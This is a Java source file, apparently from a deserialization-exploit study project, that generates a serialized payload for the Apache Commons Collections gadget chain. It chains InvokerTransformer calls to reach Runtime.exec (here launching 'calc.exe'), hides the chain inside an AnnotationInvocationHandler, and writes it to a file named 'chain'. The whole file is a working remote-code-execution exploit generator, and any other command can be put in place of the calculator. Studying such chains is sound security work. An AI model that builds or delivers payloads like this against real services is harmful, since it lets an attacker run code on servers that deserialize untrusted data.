package run.ergou.deserialize.chain;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CreatePayload {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[]{}}
                ),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[]{}}
                ),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc.exe"}
                )
        };
        Map<Object, Object> map = new HashMap<>();
        map.put("value", "xx");

        Transformer valueTransformer = new ChainedTransformer(transformers);

        Map transformedMap = TransformedMap.decorate(map, null, valueTransformer);


        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Retention.class, transformedMap);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(new File("chain")));
        oos.writeObject(obj);
        oos.close();
    }
}
